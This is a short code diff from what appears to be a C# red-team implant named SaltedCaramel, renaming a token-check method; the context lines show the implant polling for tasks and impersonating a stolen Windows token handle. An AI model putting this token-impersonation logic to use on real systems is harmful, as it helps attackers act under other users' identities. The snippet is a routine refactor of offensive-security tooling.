@@ -37,7 +37,7 @@ namespace SaltedCaramel
                 SCTaskObject task = implant.CheckTasking();
                 if (task.command != "none")
                 {
-                    if (implant.hasAlternateToken() == true)
+                    if (implant.HasAlternateToken() == true)
                     {
                         using (WindowsIdentity ident = new WindowsIdentity(Tasks.Token.stolenHandle))
                         using (WindowsImpersonationContext context = ident.Impersonate())
